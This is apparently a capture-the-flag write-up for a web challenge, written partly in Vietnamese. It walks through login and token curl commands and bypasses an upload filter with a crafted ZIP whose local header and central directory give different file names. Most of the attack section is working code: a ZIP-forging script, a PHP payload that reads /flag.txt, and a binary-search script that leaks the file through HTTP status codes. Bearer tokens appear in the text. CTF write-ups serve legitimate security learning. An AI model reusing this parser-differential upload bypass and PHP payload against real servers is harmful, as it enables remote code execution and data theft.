#                                                                                                                                                                                               ZC-1 
<img width="814" height="685" alt="image" src="https://github.com/user-attachments/assets/22450b1f-4be3-46eb-9240-f84906b5af2f" />

this web2 , we can see src is too long , summary src and how to login on this websites

<img width="1448" height="828" alt="image" src="https://github.com/user-attachments/assets/2b95920f-6a06-4115-a419-86adbad765f8" />

at main websites

<img width="1036" height="313" alt="image" src="https://github.com/user-attachments/assets/dd505d05-7286-4884-96c4-832320accf40" />

so we will send as curl to login

curl -i  -X POST 'http://web2.cscv.vn:8000/gateway/user/' -H "Content-Type:application/json" -d '{"username":"thanggay2","password":"thanggay"}'

<img width="2444" height="420" alt="image" src="https://github.com/user-attachments/assets/0affb6a8-0dac-4284-a853-f181ec7921e7" />

then we need to get token 

<img width="1641" height="482" alt="image" src="https://github.com/user-attachments/assets/cfe3d856-eec4-448e-a6f7-9ff381014c71" />


curl -i -X POST 'http://localhost:8000/auth/token/' -H "Content-Type:application/json" -d '{"username":"thanggay2","password":"thanggay"}'



<img width="2840" height="476" alt="image" src="https://github.com/user-attachments/assets/85b8ac89-55a7-4c2f-aba0-44dd265f9647" />

Next try uploading a file and accessing it.

main code handle upload and check file


<img width="1375" height="754" alt="image" src="https://github.com/user-attachments/assets/87a5472d-c050-47ef-8f84-837fc5067b82" />

main code use to access file after upload and receive notifical "Ok" or "ERR"  

<img width="1405" height="365" alt="image" src="https://github.com/user-attachments/assets/3cbbdd16-2f3e-42c4-a2c1-b3d9bfd08862" />


send file and allow extension: ALLOW_STORAGE_FILE = (".txt",".docx",".png",".jpg",".jpeg") when unzip

curl -i -X POST 'http://web2.cscv.vn:8000/gateway/transport/' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYwOTQ1MDE0LCJpYXQiOjE3NjA5NDQ3MTQsImp0aSI6Ijk4OGEyMTEyODNiZjRmMDJiODM1MTVjZjkzOTY3ODQ4IiwidXNlcl9pZCI6Ijg3NmYyNDMxLWIyNzYtNGJhMi04YzEwLTNlMTYyZDg2MzcxZCJ9.2NKz4XCiiTNMshDyJi8PWZyq4wsXNDSmYoDGsm5xoX0" -F "file=@1.zip"

<img width="2835" height="505" alt="image" src="https://github.com/user-attachments/assets/eb7f2e21-8e77-47fe-9e07-9d3be82704f8" />

check file received:
curl -i 'http://web2.cscv.vn:8000/gateway/health/?module=/storage/876f2431-b276-4ba2-8c10-3e162d86371d/1.txt'

<img width="2071" height="430" alt="image" src="https://github.com/user-attachments/assets/69aa18b8-4b82-401c-884c-2d91da4bf6dc" />

Where is vulnerability this website ????
how to upload a file .php bypass filter to rce


filezip(format)(https://en.wikipedia.org/wiki/ZIP_(file_format))


Local File Headers (LFH): These are little “stickers”. Each zipped file will have one of these “stickers” right before its data. It describes the file (e.g. name, size).

File Data: This is the actual contents of the files (like your 3.php code).

Central Directory (CD): This is the “table of contents” or “master inventory” at the bottom of the entire ZIP file. It lists all the files contained in the ZIP.


Analyze carefully at storage.php in src app2 , we can see that , when a file uploaded , it unzip as 7z , you can known that when 7z unzip ,7z only sees Local File Header (LFH) and python's checkfile() relies on Central Directory - CD . how if we create a file with Central Directory is payload.php.txt to scam python'zip and use Local File Headers with name is payload.php to excute apache

script create a file with (Local File Headers - LFH) is payload.php and Central Directory (CD) payload.php.txt by AI
```
import struct
import io
import zlib
import os
import zipfile

def create_confused_zip(php_payload_content, output_zip_path):
    if isinstance(php_payload_content, str):
        php_code = php_payload_content.encode('utf-8')
    else:
        php_code = php_payload_content

    crc32 = zlib.crc32(php_code) & 0xFFFFFFFF
    compressed_size = len(php_code)
    uncompressed_size = len(php_code)
    
    output = io.BytesIO()
    
    local_filename = b'payload.php'
    
    local_header = b'PK\x03\x04'
    local_header += b'\x14\x00'
    local_header += b'\x00\x00'
    local_header += b'\x00\x00'
    local_header += b'\x00\x00\x00\x00'
    local_header += struct.pack('<I', crc32)
    local_header += struct.pack('<I', compressed_size)
    local_header += struct.pack('<I', uncompressed_size)
    local_header += struct.pack('<H', len(local_filename))
    local_header += b'\x00\x00'
    local_header += local_filename
    
    output.write(local_header)
    output.write(php_code)
    
    cd_offset = output.tell()
    
    central_filename = b'payload.php.txt'
    
    central_header = b'PK\x01\x02'
    central_header += b'\x14\x00'
    central_header += b'\x14\x00'
    central_header += b'\x00\x00'
    central_header += b'\x00\x00'
    central_header += b'\x00\x00\x00\x00'
    central_header += struct.pack('<I', crc32)
    central_header += struct.pack('<I', compressed_size)
    central_header += struct.pack('<I', uncompressed_size)
    central_header += struct.pack('<H', len(central_filename))
    central_header += b'\x00\x00'
    central_header += b'\x00\x00'
    central_header += b'\x00\x00'
    central_header += b'\x00\x00'
    central_header += b'\x00\x00\x00\x00'
    central_header += b'\x00\x00\x00\x00'
    central_header += central_filename
    
    output.write(central_header)
    
    eocd = b'PK\x05\x06'
    eocd += b'\x00\x00'
    eocd += b'\x00\x00'
    eocd += b'\x01\x00'
    eocd += b'\x01\x00'
    eocd += struct.pack('<I', output.tell() - cd_offset)
    eocd += struct.pack('<I', cd_offset)
    eocd += b'\x00\x00'
    
    output.write(eocd)
    
    with open(output_zip_path, 'wb') as f:
        f.write(output.getvalue())

    print(f"[+] Đã tạo file ZIP tinh vi: {output_zip_path}")
    print(f"[+]   Trình giải nén (7z) sẽ thấy: {local_filename.decode()}")
    print(f"[+]   Trình kiểm tra (Python) sẽ thấy: {central_filename.decode()}")

if __name__ == "__main__":
    payload_php = """<?php
    $flag = file_get_contents('/flag.txt');

    $pos = isset($_GET['pos']) ? intval($_GET['pos']) : 0;
    $char_to_compare = isset($_GET['char']) ? $_GET['char'] : '';

    if ($pos < strlen($flag) && $char_to_compare !== '') {
        $secret_char = $flag[$pos];
        if ($secret_char > $char_to_compare) {
            http_response_code(200);
        } else {
            http_response_code(404);
        }
    } else {
        http_response_code(400);
    }
    ?>"""
    
    create_confused_zip(payload_php, 'exploit.zip')
    
    print("\n[+] Đang tự kiểm tra...")
    try:
        with zipfile.ZipFile('exploit.zip', 'r') as zf:
            namelist = zf.namelist()
            print(f"[+] Thư viện zipfile của Python thấy: {namelist}")
            if namelist == ['payload.php.txt']:
                print("[+] THÀNH CÔNG! Python đã bị lừa.")
            else:
                print("[-] THẤT BẠI! Python không thấy tên file giả.")
    except Exception as e:
        print(f"[-] Lỗi khi đọc file zip: {e}")

```

after you execute this script it will generate a php file that php file will try each character of flag at first index till the end of flag equivalent to last index

after that you execute this script python:


```
import requests
import sys
import string
import time
import base64
import json

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYxMjI2ODI4LCJpYXQiOjE3NjEyMjY1MjgsImp0aSI6IjM3NzJkMTJiNzdmNzRiZjZhMzExOWMxN2EwMjI4YzY3IiwidXNlcl9pZCI6IjQxYWRmYTc0LTJlYzktNDI2MS04NWQ2LTE0ZWQ5MjNlNWNmOSJ9.4_8QQGbDaeofsVnpBeV3WOf7_xV1DZVVpxHnryzsLYA"
USER_ID = "41adfa74-2ec9-4261-85d6-14ed923e5cf9"

BASE_URL = "http://localhost:8000"
ZIP_FILE = "exploit.zip"
FLAG = ""
POS_TO_GUESS = 0

s = requests.Session()
s.headers.update({'Authorization': f'Bearer {TOKEN}'})

print("="*40)
print(f"Binary search: {USER_ID}")
print("="*40)

try:
    with open(ZIP_FILE, 'rb') as f_zip:
        zip_content = f_zip.read()
except FileNotFoundError:
    print(f"khong tim thay file'{ZIP_FILE}'.")
    sys.exit()

while True:
    print(f"\n[+] toi vi tri thu: {POS_TO_GUESS}")
    
    low = 32
    high = 126
    found_char = ""

    while low <= high:
        mid = (low + high) // 2
        char_to_compare = chr(mid)
        
        print(f"\r  dang thu: '{char_to_compare}'")
        
        try:
            files = {'file': (ZIP_FILE, zip_content, 'application/zip')}
            r_upload = s.post(f"{BASE_URL}/gateway/transport/", files=files, timeout=10)
            
            if r_upload.status_code != 200 or r_upload.text.strip() != '"OK"':
                print(f"\n[!] loi khi tai len: Status {r_upload.status_code} - {r_upload.text}")
                print("[!] token het han roi cha oi")
                sys.exit()

            url_guess = f"{BASE_URL}/gateway/health/?module=/storage/{USER_ID}/payload.php?pos={POS_TO_GUESS}%26char={char_to_compare}"
            r_guess = s.get(url_guess, timeout=10)
            
            if r_guess.status_code == 200 and r_guess.text.strip() == '"OK"':
                low = mid + 1
            else:
                high = mid - 1
                
        except requests.exceptions.RequestException as e:
            time.sleep(2)
            continue

    if low > 126:
         print(f"\n[!] khong tim hay ASC2 phu hop {POS_TO_GUESS}.")
         print(f"[+] Flag: {FLAG}")
         sys.exit()
         
    found_char = chr(low)
    
    FLAG += found_char
    print(f"\r  [+] vi tri: {POS_TO_GUESS}: '{found_char}'   ")
    print(f"  [*] Flag hien tai: {FLAG}")
    
    if found_char == '}':
        print("\n" + "="*40)
        print(f"[+] Xong 🚩")
        print(f"[+] FLAG: {FLAG}")
        print("="*40)
        sys.exit()
        
    POS_TO_GUESS += 1
```

This script will try to upload our zip file first each time then try to access the path /gateway/health/?module=/storage/{USER_ID} if it returns 200 it will accept that character

Remember you need to update TOKEN and USER_ID of this script python

problem solved: 

<img width="1051" height="208" alt="image" src="https://github.com/user-attachments/assets/2b717ed5-1471-4434-a9aa-7ca1dc380426" />













